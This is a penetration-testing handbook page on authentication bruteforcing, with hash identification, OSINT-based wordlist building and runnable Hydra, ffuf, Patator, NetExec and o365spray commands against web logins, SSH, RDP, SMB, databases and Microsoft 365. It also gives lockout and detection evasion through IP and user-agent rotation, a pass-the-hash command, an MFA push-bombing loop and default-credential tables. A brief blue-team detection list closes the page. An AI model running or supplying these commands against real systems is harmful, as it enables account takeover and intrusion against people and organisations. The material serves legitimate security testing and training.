# Bruteforcing

Authentication bruteforcing attacks to guess credentials or bypass login mechanisms.

Bruteforcing remains one of the most effective initial access vectors in modern cybersecurity. In October 2023, a year-long Iran-backed campaign targeted critical infrastructure sectors including healthcare, government, information technology, engineering, and energy using bruteforce techniques such as password spraying to gain initial access to Microsoft 365, Azure, and Citrix systems . The joint advisory from the FBI, NSA, CISA, and international partners highlighted that threat actors frequently obtain valid user credentials via bruteforce attacks before moving laterally through networks using RDP, Kerberos SPN, or Active Directory .

This guide covers the complete toolkit for bruteforce testing, from hash identification and wordlist generation to advanced evasion techniques used in real-world breaches.

## Password Identification

Before attempting to crack any password hash, you must correctly identify the hash type. Using outdated tools can lead to misidentification. HashID's last update was in 2015, and Hash-Identifier in 2011 . Modern tools provide better accuracy and prioritization.

### Modern Hash Identification

```bash
# Name That Hash - The modern standard (2021+)
# Supports over 300 hash types with popularity prioritization
# GitHub: https://github.com/HashPals/Name-That-Hash

# Installation
pip3 install name-that-hash

# Basic identification
nth --text "5f4dcc3b5aa765d61d8327deb882cf99"

# Output includes:
# - Hash name (MD5)
# - Popularity rating (prioritizes NTLM over Skype hash)
# - Where the hash is commonly used
# - HashCat mode number
# - John the Ripper format

# JSON output for scripting
nth --json --text "$hash_string"

# Accessible mode (no ASCII art)
nth --accessible --text "$hash_string"

# Web version available at: https://nth.skerritt.blog
```

Name That Hash prioritizes popular hashes first, solving the old problem where tools would display obscure Skype hashes before common ones like NTLM . The tool provides human-readable descriptions explaining where and how each hash type is typically used .

### Legacy Hash Tools

```bash
# hashid - Still useful for basic identification
hashid -m '$2a$10$...'  # Shows hashcat mode
hashid -j '$2a$10$...'  # Shows John the Ripper format

# hash-identifier (legacy, 2011 vintage)
hash-identifier
```

### Hash Type Recognition Guide

| Hash Pattern | Typical Type | Common Context |
|--------------|--------------|----------------|
| `$2a$`, `$2b$`, `$2y$` | bcrypt | Modern web apps |
| `$6$` | SHA-512 crypt | Linux shadow files |
| `$5$` | SHA-256 crypt | Linux shadow files |
| `$1$` | MD5 crypt | Older Unix systems |
| 32 hex chars | MD5 | Legacy systems, file checksums |
| 40 hex chars | SHA-1 | Git commits, legacy TLS |
| 64 hex chars | SHA-256 | Modern security |
| 32 char hex (uppercase) | NTLM | Windows authentication |

## Wordlist Generation

Effective wordlist generation is the difference between a successful assessment and wasted time. Real-world password attacks use targeted wordlists derived from OSINT rather than generic dictionaries.

### CeWL - Custom Wordlist Generation

CeWL (Custom Word List generator) spiders websites and builds wordlists from the content, capturing names, places, and context-specific terms that users incorporate into passwords .

```bash
# Basic spidering - depth 2, minimum 5 chars
cewl https://target.com -d 2 -m 5 -w custom_wordlist.txt

# Include numbers (captures birth years, dates)
cewl https://target.com --with-numbers -d 3 -w wordlist_with_numbers.txt

# Extract email addresses
cewl https://target.com --email -e -d 2 -w emails.txt

# Save raw words without case conversion
cewl https://target.com --lowercase -d 3 -m 4 -w case_sensitive.txt

# Authenticated crawling
cewl https://target.com/dashboard --cookie "session=abc123" -d 3 -w auth_wordlist.txt

# Example from HTB Academy exercise:
# Target information: Mark White, born August 5, 1998, wife Maria, son Alex, cat Bella
cewl -d 1 -m 2 --with-numbers -w mark_initial.txt http://localhost:8000/mark.html
# Result: Captures "Mark", "White", "Maria", "Alex", "Bella", "1998" 
```

### LongTongue - Password Variation Engine

```bash
# https://github.com/edoardottt/longtongue
python3 longtongue.py -w base_words.txt -o passwords.txt

# Generate variations with common substitutions
# 0->o, 1->i, 3->e, 4->a, 5->s, 7->t, $->s
python3 longtongue.py -w base.txt -o mutated.txt --mutations l33t

# Add years to words
python3 longtongue.py -w base.txt --years 2020,2021,2022,2023,2024
```

### Username Wordlist Generation

```bash
# namemash.py - Generate username permutations from full names
# https://github.com/AhmedMohamedDev/namemash.py

python namemash.py names.txt > usernames.txt

# Input format: "John Smith" or "Smith, John"
# Output formats:
# - jsmith
# - john.smith
# - smith.john
# - johns
# - smithj
# - j.smith

# Generate from company email patterns
cat employees.txt | awk -F'@' '{print $1}' >> usernames.txt
```

### Rule-Based Generation with HashCat Rules

```bash
# HashCat rule files - Transform base words into password candidates
# Best practice rule files:
# - best64.rule (included with HashCat)
# - d3ad0ne.rule (aggressive)
# - rockyou-30000.rule

hashcat --stdout -r best64.rule base_words.txt > mutated_passwords.txt

# Common rule examples (syntax):
# :         - no change
# l         - lowercase all
# u         - uppercase all
# c         - capitalize first
# r         - reverse
# $1 $2 $3  - append numbers
# ^1 ^2 ^3  - prepend numbers
# so0       - replace o with 0
# ss5       - replace s with 5
```

### OSINT-Driven Wordlist Creation

The most effective wordlists come from target-specific OSINT. For a real engagement against a company, collect:

```bash
# Scrape LinkedIn profiles for employee names
# Extract company blog post authors
# Gather social media handles
# Collect conference speaking topics
# Identify pet names from social media
# Note important dates (company founding, anniversaries)
# Document office locations and local sports teams

# Combine all sources
cat names.txt positions.txt locations.txt sports.txt pets.txt dates.txt > raw_seeds.txt

# Generate permutations
cewl --with-numbers -d 1 -w targeted.txt company_website.html
python3 longtongue.py -w raw_seeds.txt -o expanded.txt
hashcat --stdout -r best64.rule targeted.txt >> final_wordlist.txt
```

## HTTP Bruteforcing

### Hydra - Network Login Cracker

Hydra is the standard tool for online bruteforcing, supporting over 50 protocols. It uses parallel connections by default but can be throttled for evasion.

#### HTTP GET Form (DVWA Low Security Example)

The Damn Vulnerable Web Application (DVWA) provides a controlled environment for learning bruteforce techniques. At Low security level, the login form uses GET requests with no CSRF protection .

```bash
# Basic HTTP GET form attack
hydra -L users.txt -P passwords.txt target.com http-get-form \
  "/login:username=^USER^&password=^PASS^:F=Invalid credentials"

# DVWA GET form with cookie (security level low)
hydra -L /usr/share/seclists/Usernames/top_shortlist.txt \
  -P /usr/share/seclists/Passwords/rockyou-40.txt \
  -e ns -F -u -t 1 -w 10 -v -V 192.168.1.44 http-get-form \
  "/DVWA/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:S=Welcome to the password protected area:H=Cookie\: security=low; PHPSESSID=${SESSIONID}"
```

Options explained:
- `-L/-P` : Username/password wordlist files
- `-e nsr` : Try null password, same as username, username reversed
- `-F` : Stop after first successful login
- `-u` : Loop usernames for each password (password spraying mode)
- `-t` : Number of parallel threads (default 16)
- `-w` : Time wait between requests in seconds
- `-v -V` : Verbose output
- `:S=` : String in response that indicates success
- `:F=` : String that indicates failure
- `:H=` : Custom header (cookie, user-agent)

#### HTTP POST Form

```bash
# Standard POST login
hydra -l admin -P /usr/share/wordlists/rockyou.txt target.com http-post-form \
  "/login.php:user=^USER^&pass=^PASS^:F=Login failed"

# HTTPS POST with custom failure string
hydra -l admin -P passwords.txt target.com -s 443 -S https-post-form \
  "/secure/login:username=^USER^&password=^PASS^&submit=Login:F=Invalid credentials"

# POST with JSON body
hydra -l admin -P passwords.txt target.com https-post-form \
  "/api/login:{\"username\":\"^USER^\",\"password\":\"^PASS^\"}:S=200"
```

#### Basic Authentication

```bash
# Basic auth header
hydra -L users.txt -P passwords.txt target.com http-get /admin

# With specific realm
hydra -L users.txt -P passwords.txt target.com http-get \
  "/restricted/:Realm=Restricted Area"
```

#### With Cookies and Session Management

DVWA Medium security adds a 3-second delay on failed logins, and High security adds CSRF tokens and random delays between 0-4 seconds . These require proper session handling.

```bash
# Extract CSRF token first
CSRF=$(curl -s -c dvwa.cookie "http://target.com/DVWA/login.php" | \
  awk -F 'value=' '/user_token/ {print $2}' | cut -d "'" -f2)
SESSIONID=$(grep PHPSESSID dvwa.cookie | awk -F ' ' '{print $7}')

# Hydra with CSRF token
hydra -l admin -P passwords.txt target.com http-post-form \
  "/login.php:username=^USER^&password=^PASS^&user_token=^TOKEN^:F=error" \
  -H "Cookie: PHPSESSID=${SESSIONID}"
```

### ffuf - Web Fuzzing for Authentication

ffuf provides more granular control over response analysis and is particularly effective for bruteforcing login endpoints .

```bash
# POST login form bruteforce
ffuf -w users.txt:USER -w passwords.txt:PASS \
  -u https://target.com/login \
  -X POST -d "username=USER&password=PASS" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -fc 401,403 -mc 200,302,303

# Filter by response length (identifies successful login)
ffuf -w passwords.txt -u https://target.com/login \
  -X POST -d "user=admin&pass=FUZZ" \
  -fl 480  # Filter out responses with length 480 (failed attempts)

# Rate limiting evasion
ffuf -w passwords.txt -u https://target.com/login \
  -X POST -d "user=admin&pass=FUZZ" \
  -rate 10 -fc 401

# With delay randomization
ffuf -w passwords.txt -u https://target.com/login \
  -p 0.5-2.0  # Random delay between 0.5 and 2 seconds
```

### Patator - Modular Bruteforce Tool

Patator is a multi-threaded tool written in Python that excels at handling complex authentication scenarios where Hydra might struggle.

```bash
# HTTP POST with JSON body
patator http_fuzz url=https://target.com/login method=POST \
  body='{"username":"admin","password":"FILE0"}' \
  0=/path/to/passwords.txt \
  accept_cookie=1 follow=1 \
  -x ignore:fgrep='Invalid credentials'

# HTTP Basic Auth
patator http_fuzz url=https://target.com/admin \
  user_pass=FILE0:FILE1 \
  0=users.txt 1=passwords.txt \
  -x ignore:code=401

# GET with multiple parameters
patator http_fuzz url=https://target.com/search \
  method=GET \
  q='FILE0' \
  0=queries.txt \
  -x ignore:fgrep='No results found'

# With custom headers
patator http_fuzz url=https://target.com/api/login \
  method=POST \
  body='{"user":"admin","pass":"FILE0"}' \
  header='Authorization: Bearer token123' \
  0=passwords.txt
```

### Real-World Example: Microsoft 365 Password Spraying

In the Iran-backed campaign discovered in October 2023, threat actors used password spraying against Microsoft 365, Azure, and Citrix systems. After gaining access, they employed MFA fatigue (push bombing) by bombarding users with MFA requests until accidental approval .

For testing similar configurations:

```bash
# OAuth2 token endpoint spray
hydra -L valid_users.txt -p 'Autumn2024!' login.microsoftonline.com https-post-form \
  "/common/oauth2/token:grant_type=password&username=^USER^&password=^PASS^&client_id=...:F=error_description"

# Modern approach with o365spray
# https://github.com/0xZDH/o365spray
python3 o365spray.py --spray -u users.txt -p 'Winter2024!' --url https://login.microsoftonline.com
```

## Service Bruteforcing

### SSH Bruteforcing

SSH remains a common target. Rate limiting and fail2ban are typical defenses.

```bash
# Standard SSH attack
hydra -l root -P passwords.txt ssh://target.com

# Multiple usernames, slow down
hydra -L users.txt -P passwords.txt target.com ssh -t 4 -w 5

# Medusa - Alternative SSH bruteforcer
medusa -h target.com -u root -P passwords.txt -M ssh -t 5

# Ncrack - More stealthy, supports resume
ncrack -p 22 --user root -P passwords.txt target.com -T 5

# SSH key bruteforcing (less common)
ncrack -p 22 --user admin --passive target.com
```

### RDP (Remote Desktop Protocol)

RDP bruteforcing is common in Windows environments, often combined with NLA (Network Level Authentication).

```bash
# Hydra RDP
hydra -l administrator -P passwords.txt rdp://target.com

# Ncrack for RDP
ncrack -p 3389 --user administrator -P passwords.txt target.com

# Crowbar - RDP-specific with better NLA handling
crowbar -b rdp -s target.com/32 -u admin -C passwords.txt -n 1

# xfreerdp with password list (Windows)
while read p; do
  xfreerdp /v:target.com /u:admin /p:"$p" /cert-ignore +auth-only
done < passwords.txt
```

### FTP Bruteforcing

```bash
# Standard FTP
hydra -L users.txt -P passwords.txt ftp://target.com

# Anonymous FTP check
hydra -l anonymous -P "" target.com ftp

# With specific port
hydra -l admin -P passwords.txt -s 2121 ftp://target.com
```

### SMB (Server Message Block)

SMB bruteforcing is essential for Windows network assessments. CrackMapExec (now NetExec) is the industry standard .

```bash
# Hydra SMB
hydra -L users.txt -P passwords.txt smb://target.com

# NetExec (formerly CrackMapExec) - Standard for AD environments
netexec smb target.com -u users.txt -p passwords.txt

# Check single credential
netexec smb target.com -u administrator -p 'Password123!'

# Pass-the-Hash attack
netexec smb target.com -u administrator -H 'aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c'

# Enumerate shares after authentication
netexec smb target.com -u admin -p 'pass' --shares

# Execute command
netexec smb target.com -u admin -p 'pass' -x 'whoami'

# LDAP enumeration via SMB
netexec smb target.com -u user -p 'pass' --users
```

### Database Services

```bash
# MySQL
hydra -l root -P passwords.txt mysql://target.com
hydra -L users.txt -P passwords.txt target.com mysql

# PostgreSQL
hydra -l postgres -P passwords.txt postgresql://target.com

# MSSQL
hydra -l sa -P passwords.txt mssql://target.com

# MongoDB (requires specific tooling)
nmap -p 27017 --script mongodb-brute target.com
```

### Other Network Services

```bash
# SNMP (community strings)
hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt target.com snmp

# SMTP (VRFY and RCPT TO enumeration)
hydra -l user@target.com -P passwords.txt smtp://target.com

# POP3
hydra -l user -P passwords.txt pop3://target.com

# IMAP
hydra -l user -P passwords.txt imap://target.com

# Telnet (often no lockout policy)
hydra -L users.txt -P passwords.txt telnet://target.com

# Redis (often no authentication by default)
redis-benchmark -h target.com -c 1 -n 1 -a "password"
```

## Password Spraying

Password spraying is the practice of trying a single password against many usernames. This technique avoids account lockout policies that trigger after 3-5 failed attempts per account . The Iran-backed campaign specifically used password spraying against M365 and Azure environments .

### Password Spraying Strategy

Traditional bruteforcing tries many passwords against few users, triggering lockouts. Password spraying tries few passwords against many users, staying under detection thresholds.

```bash
# Hydra password spray mode (-u flag)
hydra -L users.txt -p 'Summer2024!' target.com http-post-form "/login:..." -u

# NetExec password spray (one password, many users)
netexec smb target.com -u users.txt -p 'Company2024!' --continue-on-success

# NetExec with domain
netexec smb dc.target.com -u users.txt -p 'Winter2024!' -d target.local
```

### Automated Password Spraying with nxcspray

For Active Directory environments with lockout policies, nxcspray automates spray cycles respecting reset counters and lockout thresholds .

```bash
# nxcspray - Smart spraying with lockout awareness
# https://github.com/Lins3t/nxcspray

bash ./nxcspray.sh -t 10.1.1.1 -m smb -u ./users.txt -p ./passwords.txt -a 5 -i 30 -d test.local -n 445

# Parameters:
# -a 5 : Test 5 passwords per delay cycle
# -i 30 : Wait 30 minutes between unique passwords
# -d : Domain name
# -m : Protocol (SMB, LDAP, RDP, etc.)

# LDAP password spray (less likely to trigger lockouts)
netexec ldap dc.target.com -u users.txt -p 'Password123!' --continue-on-success
```

### Password Spraying Best Practices

From real-world attack analysis :

1. **Research common password patterns** for the target organization
   - Season + Year (Spring2024, Summer2024)
   - Company name + number (Contoso123)
   - Default corporate password policy requirements

2. **Enumerate valid usernames first** via O365, RDP, or SMTP
   ```bash
   # O365 username enumeration
   python3 o365spray.py --enum -u users.txt --url https://login.microsoftonline.com
   
   # Kerberos username enumeration
   kerbrute userenum --dc dc.target.com -d target.com users.txt
   ```

3. **Space sprays over time** (hours or days)

4. **Monitor for "impossible travel"** alerts during testing 

## Evasion Techniques

### Rate Limiting and Timing

Modern applications implement rate limiting and progressive delays. DVWA Medium security adds a 3-second delay on failed logins, and High security adds random delays between 0-4 seconds .

```bash
# Hydra single thread with wait
hydra -l admin -P passwords.txt target.com http-post-form "/login:..." -t 1 -w 3

# ffuf with random delays
ffuf -w passwords.txt -u https://target.com/login -p 0.5-3.0

# Manual throttling with sleep
while read p; do
  curl -X POST -d "user=admin&pass=$p" https://target.com/login
  sleep 2
done < passwords.txt
```

### IP Rotation

```bash
# Using proxychains with rotating proxy list
proxychains hydra -l admin -P passwords.txt target.com http-post-form "/login:..."

# proxychains.conf
# socks4 127.0.0.1 9050
# http 192.168.1.1 8080
# http 192.168.1.2 8080

# Using VPN rotation (multiple VPN configurations)
# Switch VPN endpoint after X attempts
```

### User-Agent Rotation

```bash
# Hydra with random user agent
hydra -l admin -P passwords.txt target.com http-post-form "/login:..." \
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

# Burp Suite Intruder with User-Agent payload list
# ffuf with header file
ffuf -w passwords.txt -u https://target.com/login -H "User-Agent: FUZZ" -w user-agents.txt
```

### CSRF Token Handling

For DVWA High security and similar implementations with CSRF tokens:

```bash
# Extract token dynamically
# Single-threaded approach required as tokens change per request

#!/bin/bash
while read pass; do
  # Get fresh token each attempt
  TOKEN=$(curl -s -c cookies.txt http://target.com/login | grep -oP 'name="token" value="\K[^"]+')
  
  # Submit with token
  curl -s -b cookies.txt -X POST \
    -d "username=admin&password=$pass&token=$TOKEN" \
    http://target.com/login | grep -q "Welcome" && echo "Found: $pass"
  
  sleep 2  # Respect rate limiting
done < passwords.txt
```

### MFA Bypass: Push Bombing (Fatigue Attack)

Real-world attackers have successfully bypassed MFA through push bombing, also known as MFA fatigue . After obtaining valid credentials via password spraying, attackers trigger numerous MFA push notifications, hoping the user will accidentally approve.

```bash
# After obtaining valid credentials
# Send repeated authentication requests to trigger MFA pushes

# OAuth2 token request with MFA challenge
while true; do
  curl -X POST https://login.microsoftonline.com/common/oauth2/token \
    -d "grant_type=password&username=valid_user@target.com&password=known_pass&client_id=..."
  sleep 5  # Rapid requests generate multiple push notifications
done
```

## Default Credentials Testing

Default credentials remain a critical security gap. Many systems, routers, and web applications ship with default credentials that are never changed .

### Default Credentials Database

```bash
# DefaultCreds-cheat-sheet - Comprehensive database
# https://github.com/ihebski/DefaultCreds-cheat-sheet

# Installation
pip3 install defaultcreds-cheat-sheet

# Search for product credentials
creds search tomcat

# Output:
# +----------------------------------+------------+------------+
# | Product                          |  username  |  password  |
# +----------------------------------+------------+------------+
# | apache tomcat (web)              |   tomcat   |   tomcat   |
# | apache tomcat (web)              |   admin    |   admin    |

# Export to files for bruteforcing
creds search tomcat export
# Creds saved to /tmp/tomcat-usernames.txt , /tmp/tomcat-passwords.txt

# Update the database
creds update

# Pass Station - Advanced search CLI
# https://github.com/noraj/pass-station
pass-station search cisco
```

### Common Default Credentials to Test Manually

| Vendor/Product | Default Username | Default Password |
|----------------|------------------|------------------|
| Cisco routers | admin | cisco, admin |
| Juniper | root | (blank), juniper |
| HP iLO | Administrator | (blank) |
| Dell iDRAC | root | calvin |
| MongoDB | (none) | (none) |
| Redis | (none) | (none) |
| MySQL | root | (blank) |
| PostgreSQL | postgres | postgres |
| Tomcat | admin, tomcat | admin, tomcat |
| Jenkins | admin | (first-time file) |
| WordPress admin | admin | admin |
| Raspberry Pi OS | pi | raspberry |
| VMware ESXi | root | (blank) |

### Tools for Default Credential Discovery

```bash
# changeme - Automated default credential testing
# https://github.com/ztgrace/changeme
changeme --hosts hosts.txt --services ssh,http

# routersploit - Router exploitation framework
# https://github.com/threat9/routersploit
routersploit
rsf > use scanners/autopwn
rsf > set target 192.168.1.0/24
rsf > run
```

## Wordlist Resources

### Default Kali Linux Wordlists

```bash
# RockYou (classic, 14 million passwords)
/usr/share/wordlists/rockyou.txt.gz
gunzip /usr/share/wordlists/rockyou.txt.gz

# SecLists (comprehensive collection)
/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt
/usr/share/seclists/Passwords/darkweb2017-top10000.txt
/usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt

# Username wordlists
/usr/share/seclists/Usernames/top-usernames-shortlist.txt
/usr/share/seclists/Usernames/Names/names.txt
/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt

# Default credentials
/usr/share/seclists/Passwords/Default-Credentials
```

### External Wordlist Resources

- **SecLists** (GitHub): Most comprehensive collection
- **RockYou2021** (9 billion entries, for research only)
- **Probable Wordlists** (curated by CynoSure Prime)
- **Weakpass** (aggregated wordlist archive)

## Detection and Mitigation (Blue Team Reference)

From the joint advisory on the Iran-backed campaign , defenders should monitor for:

### Detection Indicators
- **Impossible logins**: Suspicious logins with changing usernames, user agent strings, and IP address combinations
- **Impossible travel**: Logins from multiple IP addresses with significant geographic distance in unrealistic timeframes
- **Single IP used for multiple accounts** excluding expected service accounts
- **MFA registrations from unexpected locales or unfamiliar devices**
- **Processes attempting to access or copy ntds.dit** from domain controllers
- **Suspicious privileged account use** after password resets
- **Unusual activity in typically dormant accounts**
- **Unusual user agent strings** not associated with normal user activity

### Mitigation Strategies
- Review IT helpdesk password management processes
- Disable accounts for departing staff immediately
- Implement phishing-resistant MFA (FIDO2/WebAuthn)
- Continuously review MFA coverage over all active, internet-facing protocols
- Provide basic cybersecurity training to users
- Align password policies with NIST Digital Identity Guidelines
- Disable RC4 for Kerberos authentication

## Related Topics

- [Password Cracking](https://www.pentest-book.com/others/password-cracking) - Hash cracking with HashCat and John the Ripper
- [Wordlist Reference](https://www.pentest-book.com/others/wordlist-reference) - Wordlist selection and creation guide
- MFA Bypass Techniques (Push bombing, session hijacking, SIM swapping)
